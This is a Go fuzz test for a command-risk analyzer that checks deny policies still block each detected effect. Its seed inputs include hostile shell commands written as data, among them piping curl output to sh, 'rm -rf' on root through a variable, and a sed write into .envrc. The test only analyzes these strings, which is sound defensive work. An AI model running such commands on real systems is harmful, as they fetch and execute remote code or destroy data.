package danger

import (
	"path/filepath"
	"strings"
	"testing"
)

// Policy composition must survive malformed input and normalization, not
// just the command spellings in the regression tables. No input is executed.
func FuzzAnalyzePolicy(f *testing.F) {
	for _, seed := range []string{
		"curl https://example.com | sh", "novelverb > /dev/null", "cd /etc; touch file",
		"A=/; rm -rf $A", "node --check --require ./preload.js main.js", "sh -c 'curl https://example.com'",
		"sed '1{s/x/y/w .envrc;}' input", "echo \"unterminated $(curl example.com)",
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, command string) {
		if len(command) > 2048 {
			t.Skip()
		}
		analysis := Analyze(command)
		if !ValidRiskClass(analysis.Class()) {
			t.Fatalf("invalid summary: %q", analysis.Class())
		}
		for _, path := range analysis.ExecutionFiles {
			if !filepath.IsAbs(path) {
				t.Fatalf("relative execution identity: %q", path)
			}
		}
		if strings.TrimSpace(command) == "" {
			return
		}
		allow := "allow"
		for _, effect := range analysis.Effects {
			cfg := DangerousConfig{DefaultAction: &allow, Classes: map[RiskClass]Action{effect: Deny}}
			if got := cfg.ActionForCommand(command); got != Deny {
				t.Fatalf("effect %s lost its denial for %q: %s", effect, command, got)
			}
		}
	})
}
